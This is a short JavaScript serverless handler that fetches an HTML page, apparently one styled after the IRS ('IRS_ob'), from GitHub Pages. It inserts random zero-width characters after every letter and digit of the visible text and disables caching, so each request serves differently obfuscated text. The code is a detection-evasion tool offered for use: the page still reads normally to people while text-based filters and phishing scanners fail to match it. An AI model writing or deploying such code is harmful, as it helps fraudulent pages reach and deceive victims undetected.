import fetch from "node-fetch";

// Function to generate random obfuscation patterns
function randomObfuscationPattern() {
    const obfuscationMethods = [
        (char) => `${char}&#x200B;`, // Zero-width space
        (char) => `${char}&#x2060;`, // Invisible separator
        (char) => `${char}&#xFEFF;`, // Zero-width no-break space
        (char) => `${char}&#x200D;`, // Zero-width joiner
    ];
    return obfuscationMethods[Math.floor(Math.random() * obfuscationMethods.length)];
}

// Function to obfuscate **only text** inside HTML elements while keeping structure intact
function obfuscateText(text) {
    return text.replace(/([a-zA-Z0-9])/g, (match) => {
        return randomObfuscationPattern()(match);
    });
}

// API Handler to serve obfuscated HTML
export default async function handler(req, res) {
    try {
        // Fetch the original HTML (Replace with your actual GitHub Pages URL)
        const response = await fetch("https://mightyflavor.github.io/obfuscationnn/IRS_ob"); // Replace with actual URL
        let html = await response.text();

        // Preserve HTML structure and obfuscate only visible text
        let modifiedHTML = html.replace(/>([^<>]+)</g, (match, text) => {
            if (text.trim() !== "") {
                return ">" + obfuscateText(text) + "<"; // Obfuscate text while keeping tags intact
            }
            return match; // Leave empty tags unchanged
        });

        // Set cache-control headers to prevent caching & ensure fresh obfuscation on each reload
        res.setHeader("Content-Type", "text/html");
        res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
        res.setHeader("Expires", "0");
        res.setHeader("Pragma", "no-cache");

        return res.status(200).send(modifiedHTML);
    } catch (error) {
        console.error("Error fetching/modifying HTML:", error);
        return res.status(500).send("Error fetching or modifying HTML.");
    }
}
